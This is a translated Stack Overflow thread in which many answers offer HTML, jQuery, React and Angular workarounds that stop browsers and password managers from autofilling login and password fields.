我们在网站的几个区域遇到了这个问题，企业希望重新向用户查询他们的用户名和密码，并且出于合同原因特别不希望密码自动填充起作用。我们发现最简单的方法是输入一个假密码字段供浏览器查找和填写，而真正的密码字段保持不变。

```
<!-- This is a fake password input to defeat the browser's autofill behavior -->
<input type="password" id="txtPassword" style="display:none;" />
<!-- This is the real password input -->
<input type="password" id="txtThisIsTheRealPassword" /> 
```

请注意，在 Firefox 和 IE 中，将任何类型密码的输入放在实际密码之前就足够了，但 Chrome 看穿了这一点，并迫使我实际命名假密码输入（通过给它一个明显的密码 id）来获得它“咬”。我使用了一个类来实现样式，而不是使用嵌入式样式，所以如果上述方法由于某种原因不起作用，请尝试一下。

* * *

## 回答 #39

> 赞同：5
> 
> 时间：2016-06-16T10:43:15.767

[**用readonly**发布的答案](https://stackoverflow.com/questions/2530/how-do-you-disable-browser-autocomplete-on-web-form-field-input-tags/24247840#24247840)非常聪明并且有效。

但是当我使用[Bootstrap](https://en.wikipedia.org/wiki/Bootstrap_%28front-end_framework%29)时，只读输入字段 - 直到获得焦点 - 用灰色背景标记。在文档加载时，您可以通过简单地锁定和解锁输入来欺骗浏览器。

所以我有一个想法将它实现到一个 jQuery 解决方案中：

```
jQuery(document).ready(function () {
    $("input").attr('readonly', true);
    $("input").removeAttr('readonly');
}); 
```

* * *

## 回答 #40

> 赞同：5
> 
> 时间：2016-07-12T15:29:04.077

我的问题主要是 Chrome 的自动填充，但我认为这可能比自动填充更成问题。

技巧：使用计时器重置表单并将密码字段设置为空白。100 毫秒的持续时间似乎是它工作的最小值。

```
$(document).ready(function() {
    setTimeout(function() {
        var $form = $('#formId');
        $form[0].reset();
        $form.find('INPUT[type=password]').val('');
    }, 100);
}); 
```

* * *

## 回答 #41

> 赞同：5
> 
> 时间：2017-03-14T09:35:37.463

我`TextMode="password" autocomplete="new-password"`在 aspx 的页面加载中使用它`txtPassword.Attributes.Add("value", '');`

* * *

## 回答 #42

> 赞同：5
> 
> 时间：2018-06-22T06:10:51.497

Google Chrome 会忽略`autocomplete="off"`某些输入的属性，包括密码输入和按名称检测到的常见输入。

例如，如果您有一个带有 name 的输入，那么*即使您告诉它不要*`address`，Chrome 也会根据在其他网站上输入的地址提供自动填充建议：

 *```
<input type="string" name="address" autocomplete="off"> 
```

如果您不希望 Chrome 这样做，那么您可以重命名或命名表单字段的名称：

```
<input type="string" name="mysite_addr" autocomplete="off"> 
```

如果您不介意自动完成之前在您的网站上输入的值，那么您可以启用自动完成。对字段名称进行命名空间应该足以防止从其他站点记住的值出现。

```
<input type="string" name="mysite_addr" autocomplete="on"> 
```

* * *

## 回答 #43

> 赞同：5
> 
> 时间：2021-07-27T03:09:35.027

现在事情发生了变化，因为我自己尝试了旧答案不再起作用。

我确信它会起作用的实施。我在 Chrome、Edge 和 Firefox 中对此进行了测试，它确实可以解决问题。您也可以试试这个并告诉我们您的经验。

```
set the autocomplete attribute of the password input element to "new-password"

<form autocomplete="off">
....other element
<input type="password" autocomplete="new-password"/>
</form> 
```

这是根据[MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion#preventing_autofilling_with_autocompletenew-password)

如果您正在定义用户管理页面，用户可以在其中为另一个人指定新密码，因此您希望防止自动填充密码字段，您可以使用`autocomplete="new-password"`

这是一个提示，浏览器不需要遵守。`<input>` 然而，出于这个原因，现代浏览器已经停止使用 autocomplete="new-password" 自动填充元素。

* * *

## 回答 #44

> 赞同：4
> 
> 时间：2015-08-13T18:22:15.840

重要的是要知道 Firefox（我认为只有 Firefox）使用一个名为`ismxfilled`基本上强制自动完成的值。

`ismxfilled="0"`为了`OFF`

或者

`ismxfilled="1"`为了`ON`

* * *

## 回答 #45

> 赞同：4
> 
> 时间：2017-02-28T10:25:30.237

如果不使用客户端和服务器端代码的组合，似乎不可能实现这一点。

为了确保用户每次都必须在没有自动完成的情况下填写表单，我使用了以下技术：

1.  在服务器上生成表单字段名称并使用隐藏的输入字段来存储这些名称，以便在提交到服务器时服务器端代码可以使用生成的名称来访问字段值。这是为了阻止用户选择自动填充字段。

2.  在表单上放置每个表单字段的三个实例，并使用 css 隐藏每组的第一个和最后一个字段，然后在使用 javascript 加载页面后禁用它们。这是为了防止浏览器自动填写字段。

这是一个演示 #2 [https://jsfiddle.net/xnbxbpv4/中描述的 javascript、css 和 html 的小提琴](https://jsfiddle.net/xnbxbpv4/)

javascript:

```
$(document).ready(function() {
    $(".disable-input").attr("disabled", "disabled");
}); 
```

CSS：

```
.disable-input {
  display: none;
} 
```

html:

```
<form>
<input type="email" name="username" placeholder="username" class="disable-input">
<input type="email" name="username" placeholder="username">
<input type="email" name="username" placeholder="username" class="disable-input">
<br>
<input type="password" name="password" placeholder="password" class="disable-input">
<input type="password" name="password" placeholder="password">
<input type="password" name="password" placeholder="password" class="disable-input">
<br>
<input type="submit" value="submit">
</form> 
```

这是一个粗略的示例，说明使用带有剃刀的 asp.net 的服务器代码将有助于#1

模型：

```
public class FormModel
{
    public string Username { get; set; }
    public string Password { get; set; }
} 
```

控制器：

```
public class FormController : Controller
{
    public ActionResult Form()
    {
        var m = new FormModel();

        m.Username = "F" + Guid.NewGuid().ToString();
        m.Password = "F" + Guid.NewGuid().ToString();

        return View(m);
    }

    public ActionResult Form(FormModel m)
    {
        var u = Request.Form[m.Username];
        var p = Request.Form[m.Password];

        // todo: do something with the form values

        ...

        return View(m);
    }
} 
```

看法：

```
@model FormModel

@using (Html.BeginForm("Form", "Form"))
{
    @Html.HiddenFor(m => m.UserName)
    @Html.HiddenFor(m => m.Password)

    <input type="email" name="@Model.Username" placeholder="username" class="disable-input">
    <input type="email" name="@Model.Username" placeholder="username">
    <input type="email" name="@Model.Username" placeholder="username" class="disable-input">
    <br>
    <input type="password" name="@Model.Password" placeholder="password" class="disable-input">
    <input type="password" name="@Model.Password" placeholder="password">
    <input type="password" name="@Model.Password" placeholder="password" class="disable-input">
    <br>
    <input type="submit" value="submit">
} 
```

* * *

## 回答 #46

> 赞同：4
> 
> 时间：2019-11-30T13:38:01.160

我尝试了几乎所有的答案，但新版 Chrome 很聪明；如果你写

```
autocomplete="randomstring" or autocomplete="rutjfkde" 
```

它会自动将其转换为

```
autocomplete="off" 
```

当输入控件获得焦点时。

所以，我用jQuery做的，我的解决方案如下。

```
$("input[type=text], input[type=number], input[type=email], input[type=password]").focus(function (e) {
    $(this).attr("autocomplete", "new-password");
}) 
```

这是最简单的，并且可以为您在表单上拥有的任意数量的控件解决问题。

* * *

## 回答 #47

> 赞同：3
> 
> 时间：2015-11-01T10:28:45.317

`autocomplete="off"`如果您从 JavaScript 动态设置，Safari 不会改变对自动完成的看法。但是，如果您在每个字段的基础上这样做，它会尊重。

```
$(':input', $formElement).attr('autocomplete', 'off'); 
```

* * *

## 回答 #48

> 赞同：3
> 
> 时间：2016-09-02T10:14:34.823

这个想法是在原始字段之前创建一个具有相同名称的不可见字段。这将使浏览器自动填充隐藏字段。

我使用以下 jQuery 片段：

```
// Prevent input autocomplete
$.fn.preventAutocomplete = function() {
    this.each(function () {
        var $el = $(this);
        $el
            .clone(false, false) // Make a copy (except events)
            .insertBefore($el)   // Place it before original field
            .prop('id', '')      // Prevent ID duplicates
            .hide()              // Make it invisible for user
        ;
    });
}; 
```

然后就`$('#login-form input').preventAutocomplete();`

* * *

## 回答 #49

> 赞同：3
> 
> 时间：2018-05-11T13:19:32.817

为了解决这个问题，我使用了一些 CSS 技巧，以下对我有用。

```
input {
    text-security:disc;
    -webkit-text-security:disc;
    -mox-text-security:disc;
} 
```

请阅读[本文](https://medium.com/@idanhareven/how-to-workaround-browsers-save-password-password-autocomplete-features-135b91ad06d2)了解更多详情。

* * *

## 回答 #50

> 赞同：3
> 
> 时间：2018-07-07T18:20:32.873

为了防止浏览器自动填充用户保存的站点登录凭据，请在表单顶部放置一个文本和密码输入字段，其中包含非空值和样式“位置：绝对；顶部：-999px；左侧：-999px”设置为隐藏田野。

```
<form>
  <input type="text" name="username_X" value="-" tabindex="-1" aria-hidden="true" style="position: absolute; top: -999px; left:-999px" />
  <input type="password" name="password_X" value="-" tabindex="-1" aria-hidden="true" style="position: absolute; top: -999px; left:-999px" />
  <!-- Place the form elements below here. -->
</form> 
```

在密码字段之前有一个文本字段很重要。否则在某些情况下可能无法阻止自动填充。

重要的是文本和密码字段的值都不能为空，以防止在某些情况下覆盖默认值。

重要的是，这两个字段位于表单中“真实”密码类型字段之前。

对于兼容 html 5.3 的较新浏览器，自动完成属性值“new-password”应该可以工作。

```
<form>
  <input type="text" name="username" value="" />
  <input type="password" name="password" value="" autocomplete="new-password" />
</form> 
```

这两种方法的组合可用于支持较旧和较新的浏览器。

```
<form>
  <div style="display:none">
    <input type="text" readonly tabindex="-1" />
    <input type="password" readonly tabindex="-1" />
  </div>
  <!-- Place the form elements below here. -->
  <input type="text" name="username" value="" />
  <input type="password" name="password" value="" autocomplete="new-password" />
</form> 
```

* * *

## 回答 #51

> 赞同：3
> 
> 时间：2018-11-21T23:06:45.473

如果您还想阻止普通浏览器插件`LastPass`自动填充字段，您可以将添加的属性`data-lpignore="true"`添加到该线程的其他建议中。请注意，这不仅适用于密码字段。

```
<input type="text" autocomplete="false" data-lpignore="true" /> 
```

不久前我试图做同样的事情，但因为我发现的任何建议都不适合我而感到难过。原来是`LastPass`。

* * *

## 回答 #52

> 赞同：3
> 
> 时间：2019-07-12T06:40:46.690

大多数答案都没有帮助，因为浏览器只是忽略了它们。（其中一些不是跨浏览器兼容的）。对我有用的修复是：

```
<form autocomplete="off">
    <input type="text" autocomplete="new-password" />
    <input type="password" autocomplete="new-password" />
</form> 
```

我在表单标签上设置了 autofill="off"，在不需要自动填充的地方设置了 autofill="new-password"。

* * *

## 回答 #53

> 赞同：3
> 
> 时间：2019-12-11T11:08:42.203

截至 2019 年 12 月：

在回答这个问题之前让我说，我在 SO 和不同的论坛上尝试了几乎所有的答案，但找不到适用于所有现代浏览器和 IE11 的解决方案。

所以这是我找到的解决方案，我相信这篇文章还没有讨论或提到它。

根据 Mozilla Dev Network(MDN) post about [how to turn off form autocomplete](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion)

> 默认情况下，浏览器会记住用户通过网站上的字段提交的信息。这使浏览器能够提供自动补全（即为用户已开始输入的字段建议可能的补全）或自动填充（即在加载时预填充某些字段）

在同一篇文章中，他们讨论了`autocmplete`财产的使用及其限制。正如我们所知，并非所有浏览器都如我们所愿地尊重这个属性。

**解决方案**

所以在文章的最后，他们分享了一个适用于包括 IE11+Edge 在内的所有浏览器的解决方案。它基本上是一个可以解决问题的 jQuery 插件。这是 jQuery 插件的[链接](https://terrylinooo.github.io/jquery.disableAutoFill/)及其工作原理。

代码片段：

```
$(document).ready(function () {        
    $('#frmLogin').disableAutoFill({
        passwordField: '.password'
    });
}); 
```

在 HTML 中需要注意的是密码字段是文本类型，并且`password`应用类来识别该字段：

```
<input id="Password" name="Password" type="text" class="form-control password"> 
```

希望这会对某人有所帮助。

* * *

## 回答 #54

> 赞同：3
> 
> 时间：2020-07-09T06:46:19.820

有很多答案，但其中大多数是黑客或某种解决方法。

这里有三种情况。

**案例 I：**如果这是您的标准登录表单。以任何方式关闭它可能是不好的。如果您真的需要这样做，请三思而后行。用户习惯于浏览器记住和存储密码。在大多数情况下，您不应更改该标准行为。

如果您仍然想这样做，请参阅**案例 III**

**情况二：**当这不是您的常规登录表单但输入`name`的`id`属性不是“喜欢”电子邮件、登录名、用户名、用户名、密码时。

采用

```
<input type="text" name="yoda" autocomplete="off"> 
```

**案例三：**当这不是您的常规登录表单但输入`name`的`id`属性是“喜欢”电子邮件、登录名、用户名、用户名、密码时。

例如：login、abc_login、password、some_password、password_field。

所有浏览器都带有密码管理功能，可以记住它们或建议使用更强的密码。他们就是这样做的。

但是，假设您是网站管理员，可以创建用户并设置他们的密码。在这种情况下，您不希望浏览器提供这些功能。

在这种情况下，`autocomplete="off"`将不起作用。采用`autocomplete="new-password"`

```
<input type="text" name="yoda" autocomplete="new-password"> 
```

**有用的链接：**

1.  [https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion)

* * *

## 回答 #55

> 赞同：2
> 
> 时间：2016-10-24T09:16:47.150

一种解决方法是在用户想要更改密码之前不要将密码字段插入 DOM。这可能适用于某些情况：

在我们的系统中，我们在管理页面中有一个密码字段，因此我们必须避免无意中设置其他用户的密码。由于这个原因，该表单有一个额外的复选框，它将切换密码字段的可见性。

所以在这种情况下，密码管理器的自动填充成为一个双重问题，因为用户甚至看不到输入。

解决方案是让复选框触发密码字段是否插入 DOM，而不仅仅是其可见性。

AngularJS 的伪实现：

```
<input type="checkbox" ng-model="createPassword">
<input ng-if="changePassword" type="password"> 
```

* * *

## 回答 #56

> 赞同：2
> 
> 时间：2018-03-03T00:35:09.787

您可以在输入控件中使用 autocomplete = off 来避免自动完成

例如：

```
<input type=text name="test" autocomplete="off" /> 
```

如果上面的代码不起作用，那么也尝试添加这些属性

```
autocapitalize="off" autocomplete="off" 
```

或者

将输入类型属性更改为`type="search"`. Google 不会对具有某种搜索类型的输入应用自动填充。

* * *

## 回答 #57

> 赞同：2
> 
> 时间：2018-03-26T12:07:16.957

我的解决方案是使用 Angular js 指令动态更改文本输入类型，它的工作原理就像魅力

首先添加 2 个隐藏的文本字段

只需添加一个像这样的角度指令

```
 (function () {

    'use strict';

    appname.directive('changePasswordType', directive);

    directive.$inject = ['$timeout', '$rootScope',  '$cookies'];

    function directive($timeout,  $rootScope, $cookies) {
        var directive = {
            link: link,
            restrict: 'A'
        };

        return directive;

        function link(scope,element) {
            var process = function () {
                var elem =element[0];
                elem.value.length > 0 ? element[0].setAttribute("type", "password") :
                element[0].setAttribute("type", "text");
            }

            element.bind('input', function () {
                process();
            });

            element.bind('keyup', function () {
                process();
            });
        }
    }
})() 
```

然后在需要防止自动完成的文本字段中使用它

```
 <input type="text" style="display:none">\\can avoid this 2 lines
    <input type="password" style="display:none">
    <input type="text"  autocomplete="new-password" change-password-type> 
```

注意：不要忘记包含 jquery，并设置`type ="text"`初始

* * *

## 回答 #58

> 赞同：2
> 
> 时间：2019-02-19T20:16:14.433

可以这么说，我想要一些完全脱离浏览器的字段管理的东西。在这个例子中，有一个标准的文本输入字段来捕获密码——没有电子邮件、用户名等......

```
<input id='input_password' type='text' autocomplete='off' autofocus> 
```

有一个名为“input”的变量，设置为空字符串...

```
var input = ""; 
```

现场事件由 jQuery 监控...

1.  在焦点上，字段内容和相关的“输入”变量总是被清除。
2.  在按键时，任何字母数字字符以及一些定义的符号都将附加到“输入”变量，并且字段输入被替换为项目符号字符。此外，当`Enter`按下键时，键入的字符（存储在“输入”变量中）通过 Ajax 发送到服务器。（请参阅下面的“服务器详细信息”。）
3.  在 keyup 上`Home`，`End`、 和`Arrow`键会导致“输入”变量和字段值被刷新。（我本可以喜欢箭头导航和焦点事件，并使用*.selectionStart*来确定用户单击或导航的位置，但不值得为密码字段付出努力。）此外，按下`Backspace`键会同时截断相应的变量和字段内容。

* * *

```
$("#input_password").off().on("focus", function(event) {
    $(this).val("");
    input = "";

}).on("keypress", function(event) {
    event.preventDefault();

    if (event.key !== "Enter" && event.key.match(/^[0-9a-z!@#\$%&*-_]/)) {
        $(this).val( $(this).val() + "•&quot; );
        input += event.key;
    }
    else if (event.key == "Enter") {
        var params = {};
        params.password = input;

        $.post(SERVER_URL, params, function(data, status, ajax) {
            location.reload();
        });
    }

}).on("keyup", function(event) {
    var navigationKeys = ["Home", "End", "ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown"];
    if ($.inArray(event.key, navigationKeys) > -1) {
        event.preventDefault();
        $(this).val("");
        input = "";
    }
    else if (event.key == "Backspace") {
        var length = $(this).val().length - 1 > 0 ? $(this).val().length : 0;
        input = input.substring(0, length);
    }
}); 
```

* * *

**前端总结**

从本质上讲，这使浏览器无法捕获任何有用的信息。即使它覆盖了自动完成设置，和/或显示带有先前输入值的下拉列表，它所拥有的只是为字段值存储的项目符号。

* * *

**服务器详细信息**（可选阅读）

如上所示，一旦服务器返回 JSON 响应，JavaScript 就会执行*location.reload() 。*（此登录技术用于访问受限制的管理工具。一些与 cookie 内容相关的过度杀伤力可以跳过以获得更通用的实现。）以下是详细信息：

*   当用户导航到该站点时，服务器会寻找合法的 cookie。
*   如果没有任何 cookie，则会显示登录页面。当用户输入密码并通过 Ajax 发送时，服务器会确认密码并检查用户的 IP 地址是否在授权 IP 地址列表中。
*   如果无法识别密码或 IP 地址，则服务器不会生成 cookie，因此当页面重新加载时，用户会看到相同的登录页面。
*   如果密码和 IP 地址都被识别，服务器会生成一个有效期为十分钟的 cookie，它还会存储两个与时间范围和 IP 地址对应的加扰值。
*   当页面重新加载时，服务器会找到 cookie 并验证加扰的值是否正确（即，时间范围与 cookie 的日期相对应，并且 IP 地址是否相同）。
*   每次用户与服务器交互时，无论是登录、显示数据还是更新记录，都会重复验证和更新 cookie 的过程。
*   如果 cookie 的值始终正确，则服务器会显示完整的网站（如果用户正在登录）或满足提交的任何显示或更新请求。
*   如果在任何时候 cookie 的值不正确，服务器会删除当前的 cookie，然后在重新加载时，重新显示登录页面。

* * *

## 回答 #59

> 赞同：2
> 
> 时间：2019-07-18T02:44:50.323

### 轻松破解

将输入设为只读

```
<input type="text" name="name" readonly="readonly"> 
```

超时后删除只读

```
$(function() {
    setTimeout(function() {
        $('input[name="name"]').prop('readonly', false);
    }, 50);
}); 
```

* * *

## 回答 #60

> 赞同：2
> 
> 时间：2019-07-19T11:56:20.557

不幸的是，该选项在大多数浏览器中已被删除，因此无法禁用密码提示。

直到今天，我还没有找到解决这个问题的好方法。我们现在剩下的就是希望有一天这个选项会回来。

* * *

## 回答 #61

> 赞同：2
> 
> 时间：2019-09-10T13:52:54.700

我遇到了同样的问题，今天 09/10/2019 我找到的唯一解决方案是这个

将 autocomplete="off" 添加到表单标签中。

在打开表单标签后放置 1 个错误输入。

```
<input id="username" style="display:none" type="text" name="fakeusernameremembered"> 
```

但它不适用于密码类型字段，请尝试

```
<input type="text" oninput="turnOnPasswordStyle()" placeholder="Enter Password" name="password" id="password" required> 
```

在脚本上

```
function turnOnPasswordStyle() {
    $('#password').attr('type', "password");
} 
```

这是在 Chrome-78、IE-44、Firefox-69 上测试的

* * *

## 回答 #62

> 赞同：2
> 
> 时间：2020-03-03T12:36:51.847

自动填充功能在不选择字段的情况下更改值。我们可以在状态管理中使用它来忽略 select 事件之前的状态更改。

[React](https://en.wikipedia.org/wiki/React_(web_framework))中的一个例子：

```
import React, {Component} from 'react';

class NoAutoFillInput extends Component{

    constructor() {
        super();
        this.state = {
            locked: true
        }
    }

    onChange(event){
        if (!this.state.locked){
            this.props.onChange(event.target.value);
        }
    }

    render() {
        let props = {...this.props, ...{onChange: this.onChange.bind(this)}, ...{onSelect: () => this.setState({locked: false})}};
        return <input {...props}/>;
    }
}

export default NoAutoFillInput; 
```

如果浏览器尝试填充该字段，则元素仍被锁定并且状态不受影响。现在您可以用 NoAutoFillInput 组件替换输入字段以防止自动填充：

```
<div className="form-group row">
    <div className="col-sm-2">
        <NoAutoFillInput type="text" name="myUserName" className="form-control" placeholder="Username" value={this.state.userName} onChange={value => this.setState({userName: value})}/>
    </div>
    <div className="col-sm-2">
        <NoAutoFillInput type="password" name="myPassword" className="form-control" placeholder="Password" value={this.state.password} onChange={value => this.setState({password: value})}/>
    </div>
</div> 
```

当然，这个想法也可以用于其他 JavaScript 框架。

* * *

## 回答 #63

> 赞同：2
> 
> 时间：2020-04-08T15:32:44.833

我今天找到的解决方案都没有带来真正的工作响应。

具有`autocomplete`属性的解决方案不起作用。

所以，这是我为自己写的：

```
<input type="text" name="UserName" onkeyup="if (this.value.length > 0) this.setAttribute('type', 'password'); else this.setAttribute('type', 'text');" > 
```

您应该对您希望在页面上作为密码类型的每个输入字段执行此操作。

这有效。

干杯

* * *

## 回答 #64

> 赞同：2
> 
> 时间：2020-10-23T11:27:33.717

**很确定这是迄今为止最通用的解决方案**

这也会停止自动完成和弹出建议框。

**介绍**

面对现实吧， autocomplete=off 或 new-password 似乎不起作用。它应该这样做，但它没有，每周我们都会发现其他事情发生了变化，并且浏览器正在填写一个表单，其中包含更多我们不想要的随机垃圾。我发现了一个非常简单的解决方案，不需要在登录页面上自动完成。

**如何实施**

第1步）。将相同的函数调用添加到用户名和密码字段的 onmousedown 和 onkeyup 属性，确保给它们一个 id 并在函数调用结束时记下代码。md=mousedown 和 ku=keyup

对于用户名字段，只添加一个值，`&nbsp;`因为这可以防止表单在进入页面时自动填充。

例如：

```
<input type="text" value="&nbsp;" id="myusername" onmousedown="protectMe(this,'md')" onkeyup="protectMe(this,'ku')" />
```

第2步）。在页面中包含此功能

```
function protectMe(el,action){

 // Remove the white space we injected on startup
 var v = el.value.trim();

// Ignore this reset process if we are typing content in
// and only acknowledge a keypress when it's the last Delete
// we do resulting in the form value being empty
 if(action=='ku' && v != ''){return;} 

// Fix double quote issue (in the form input) that results from writing the outerHTML back to itself
  v = v.replace(/"/g,'\\"'); 

  // Reset the popup appearing when the form came into focus from a click  by rewriting it back
  el.outerHTML=el.outerHTML; 

  // Issue instruction to refocus it again, insert the value that existed before we reset it and then select the content.
  setTimeout("var d=document.getElementById('"+el.id+"'); d.value=\""+v+"\";d.focus();if(d.value.length>1){d.select();}",100);
}
```

**它有什么作用？**

*   首先，它在字段中添加了一个`&nbsp;`空格，以便浏览器尝试查找与该字段相关的详细信息但没有找到任何内容，因此这是自动完成修复的
*   其次，当您单击时，将再次创建 HTML，取消弹出窗口，然后将值添加回选中状态。
*   最后，当您使用 Delete 按钮删除字符串时，弹出窗口通常会再次出现，但如果我们达到该点，则 keyup 检查会重复该过程。

**有哪些问题？**

*   单击选择一个字符是一个问题，但对于登录页面，大多数人会原谅它选择所有文本的事实
*   Javascript 确实会修剪空格的任何输入，但您可能希望在服务器端也这样做以确保安全

**可以更好吗？**

很可能是。这只是我测试的东西，它满足了我的基本需求，但可能有更多的技巧可以添加或更好的方法来应用所有这些。

**经测试的浏览器**

截至本文发布日期，已在最新的 Chrome、Firefox、Edge 上测试并运行

* * *

## 回答 #65

> 赞同：2
> 
> 时间：2020-10-30T21:49:28.203

在求助于创建自己的解决方案之前，我必须在这个讨论上花了两天时间：

首先，如果它适用于该任务，请放弃`input`并使用`textarea`. 据我所知，自动填充/自动完成在 a 中没有业务，`textarea`就我们想要实现的目标而言，这是一个很好的开始。现在您只需更改该元素的一些默认行为，使其表现得像`input`.

接下来，您需要将任何较长的条目保留在同一行，例如`input`，并且您需要`textarea`使用光标沿 y 轴滚动。我们还想摆脱调整大小框，因为我们正在尽最大努力模仿`input`不带有调整大小句柄的 的行为。我们通过一些快速的 CSS 实现了所有这些：

```
#your-textarea {
  resize: none;
  overflow-y: hidden;
  white-space: nowrap;
}
```

最后，您需要确保讨厌的滚动条不会破坏聚会（对于那些特别长的条目），因此请确保您的文本区域不显示它：

```
#your-textarea::-webkit-scrollbar {
  display: none;
}
```

十分简单。此解决方案的自动完成问题为零。

* * *

## 回答 #66

> 赞同：2
> 
> 时间：2021-04-09T07:39:17.003

> （它在 2021 年适用于 Chrome（v88、89、90）、Firefox、Brave 和 Safari。）
> 
> 已经写在这里的旧答案可以反复试验，但它们中的大多数都没有链接到任何官方文档或 Chrome 在这个问题上必须说的内容。

问题中提到的问题是由于 Chrome 的自动填充功能，这是 Chrome 在此错误链接中的立场 -*[问题 468153：autocomplete=off 在非登录 INPUT 元素上被忽略，评论 160](https://bugs.chromium.org/p/chromium/issues/detail?id=468153#c164)*

简单来说，有两种情况——

*   ***[案例 1]***：您的`input`类型不是`password`. 在这种情况下，解决方案很简单，分为三个步骤。

*   将`name`属性添加到`input`

*   `name`不应以电子邮件或用户名之类的值开头。否则 Chrome 仍然会显示下拉菜单。例如，`name="emailToDelete"`显示下拉菜单，但`name="to-delete-email"`不显示。这同样适用于`autocomplete`属性。

*   添加`autocomplete`属性，并添加对您有意义的值，例如`new-field-name`

它看起来像这样，在你的余生中你不会再看到这个输入的自动填充 -

```
 <input type="text/number/something-other-than-password" name="x-field-1" autocomplete="new-field-1" /> 
```

*   ***[案例2]***：`input` `type`是`password`
*   好吧，在这种情况下，无论您进行何种试验，Chrome 都会向您显示管理密码/使用现有密码的下拉菜单。Firefox 也会做类似的事情，所有其他主要浏览器也是如此。[2](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion)
*   在这种情况下，如果您真的想阻止用户查看管理密码的下拉菜单/查看安全生成的密码，您将不得不使用 JS 来切换输入类型，如本问题的其他答案中所述。

[2](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion)关于关闭自动完成的详细 MDN 文档 -*[如何关闭表单自动完成](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion)*

* * *

## 回答 #67

> 赞同：1
> 
> 时间：2016-11-17T17:41:13.600

对于 Internet Explorer 11，有一个可用于阻止自动完成的安全功能。

它是这样工作的：

*在用户输入之后*在 JavaScript 中修改的任何表单输入值都被标记为不符合自动完成的条件。

此功能通常用于保护用户免受恶意网站的侵害，这些网站希望在您输入密码后更改您的密码等。

但是，您可以在密码字符串的开头插入一个特殊字符来阻止自动完成。稍后可以检测到此特殊字符并将其删除。

* * *

## 回答 #68

> 赞同：1
> 
> 时间：2017-03-12T19:17:34.530

autocomplete = 'off' 对我不起作用，无论如何我将输入字段的 value 属性设置为空格`<input type='text' name='username' value=" ">`，即将默认输入字符设置为空格，并且由于用户名为空，因此密码也被清除。

* * *

## 回答 #69

> 赞同：1
> 
> 时间：2017-11-22T08:28:11.293

提供的答案都不适用于我测试的所有浏览器。基于已经提供的答案，这就是我在**Chrome 61**、**Microsoft Edge 40** (EdgeHTML 15)、**IE 11**、**Firefox 57**、**Opera 49**和**Safari 5.1**上得到的结果（测试） 。由于许多试验，它很古怪；但是它确实对我有用。

```
<form autocomplete="off">
    ...
    <input type="password" readonly autocomplete="off" id="Password" name="Password" onblur="this.setAttribute('readonly');" onfocus="this.removeAttribute('readonly');" onfocusin="this.removeAttribute('readonly');" onfocusout="this.setAttribute('readonly');" />
    ...
</form> 

<script type="text/javascript">
    $(function () {           
        $('input#Password').val('');
        $('input#Password').on('focus', function () {
        if (!$(this).val() || $(this).val().length < 2) {
            $(this).attr('type', 'text');
        }
        else {
            $(this).attr('type', 'password');
        }
    });
    $('input#Password').on('keyup', function () {
        if (!$(this).val() || $(this).val().length < 2) {
            $(this).attr('type', 'text');
        }
        else {
            $(this).attr('type', 'password');
        }
    });
    $('input#Password').on('keydown', function () {
        if (!$(this).val() || $(this).val().length < 2) {
            $(this).attr('type', 'text');
        }
        else {
            $(this).attr('type', 'password');
        }
    });
</script> 
```

* * *

## 回答 #70

> 赞同：1
> 
> 时间：2018-01-19T12:57:34.233

固定的。只需在真实输入字段上方添加

[https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion) - MDN [https://medium.com/paul-jaworski/turning-off-autocomplete-in-chrome-ee3ff8ef0908](https://medium.com/paul-jaworski/turning-off-autocomplete-in-chrome-ee3ff8ef0908) - 中等在 EDGE、Chrome（最新 v63）、Firefox Quantum（57.0.4 64-бит）、Firefox（52.2.0）上测试，假字段是 chrome/opera 自动填充获取错误字段的解决方法

```
 const fakeInputStyle = {opacity: 0, float: 'left', border: 'none', height: '0', width: '0'}

 <input type="password" name='fake-password' autoComplete='new-password' tabIndex='-1' style={fakeInputSyle} />

<TextField
  name='userName'
  autoComplete='nope'
  ... 
/>

<TextField
      name='password'
      autoComplete='new-password'
      ... 
    /> 
```

* * *

## 回答 #71

> 赞同：1
> 
> 时间：2018-05-08T22:07:43.547

我可以通过添加两个假输入并给它们绝对位置来阻止 Chrome 66 自动填充：

```
<form style="position: relative">
  <div style="position: absolute; top: -999px; left: -999px;">
    <input name="username" type="text" />
    <input name="password" type="password" />
  </div>
  <input name="username" type="text" />
  <input name="password" type="password" /> 
```

起初，我尝试添加`display:none;`输入，但 Chrome 忽略了它们并自动填充可见的。

* * *

## 回答 #72

> 赞同：1
> 
> 时间：2018-12-17T06:39:35.763

这对我来说就像一个魅力。

1.  将表单的自动完成属性设置为关闭
2.  添加一个虚拟输入字段并将其属性也设置为关闭。

> ```
> <form autocomplete="off">
>  <input type="text" autocomplete="off" style="display:none">
> </form> 
> ```

* * *

## 回答 #73

> 赞同：1
> 
> 时间：2019-08-01T20:09:19.083

我已经解决了在页面加载后放置此代码：

```
<script>
var randomicAtomic = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  $('input[type=text]').attr('autocomplete',randomicAtomic);
</script> 
```

* * *

## 回答 #74

> 赞同：1
> 
> 时间：2019-09-27T10:59:34.223

最简单的答案是

`<input autocomplete="on|off">`

但请记住浏览器支持。目前，自动完成属性支持

Chrome 17.0 和最新 IE 5.0 和最新
Firefox 4.0 和最新
Safari 5.2 和最新
Opera 9.6 和最新

* * *

## 回答 #75

> 赞同：1
> 
> 时间：2019-11-28T11:47:15.117

我使用 jQuery 的解决方案。它可能不是 100% 可靠的，但它对我有用。这个想法在代码注释中描述。

```
 /**
 * Prevent fields autofill for fields.
 * When focusing on a text field with autocomplete (with values: "off", "none", "false") we replace the value with a new and unique one (here it is - "off-forced-[TIMESTAMP]"),
 * the browser does not find this type of autocomplete in the saved values and does not offer options.
